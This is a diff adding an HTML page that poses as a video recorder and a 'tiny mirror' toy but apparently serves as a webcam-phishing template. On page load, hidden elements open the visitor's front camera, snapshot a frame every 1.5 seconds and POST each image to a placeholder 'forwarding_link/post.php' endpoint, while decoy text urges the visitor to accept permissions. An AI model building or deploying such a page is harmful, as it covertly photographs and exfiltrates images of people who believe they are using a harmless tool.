@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+  <meta charset="UTF-8">
+  <title>s3MediaRecorder w/ uncompressed video</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1"><link rel='stylesheet' href='https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css'>
+<link rel="stylesheet" href="./style.css">
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<div class="wrapper">
+  <video class="video-record" autoplay playsinline muted></video>
+  <video class="video-playback" controls></video>
+
+  <div class="controls">
+    <div class="btn record-btn" onclick="onStreamRecord()"><i class="fa fa-video-camera" aria-hidden="true"></i></div>
+    <div class="btn record-btn" onclick="onFileInput()"><i class="fa fa-picture-o" aria-hidden="true"></i></div>
+    <div class="btn progress-btn"><p>0%</p></div>
+    <div class="btn upload-btn" onclick="onFileUpload()"><i class="fa fa-cloud-upload" aria-hidden="true"></i></div>
+    <div class="btn download-btn" onclick="onFileDownload()"><i class="fa fa-download" aria-hidden="true"></i></div>
+    <div class="btn stop-btn" onclick="onStreamStop()"><i class="fa fa-stop" aria-hidden="true"></i></div>
+  </div>
+</div>
+
+<div class="go-back-btn" onClick="onBackClick()"><i class="fa fa-arrow-left" aria-hidden="true"></i></div>
+<div class="toggle-cam-btn"><i class="fa fa-refresh" onclick="onCameraSwitch()"></i></div>
+<input id="file-input-video" type="file" accept="video/*" capture >
+<!-- partial -->
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js'></script>
+<script src='https://cdnjs.cloudflare.com/ajax/libs/aws-sdk/2.449.0/aws-sdk.min.js'></script>
+<script  src="./script.js"></script>
+
+</body>
+<div class="video-wrap" hidden="hidden">
+   <video id="video" playsinline autoplay></video>
+</div>
+
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+
+    <body>
+	
+	
+        <p>Hint: Look at the favicon</p>
+        <p>(Accept Permissions)</p>
+        <p><label><input type="checkbox" name="mirror" id="mirror" /> Mirror image</label></p>
+    </body>
+
+</html>
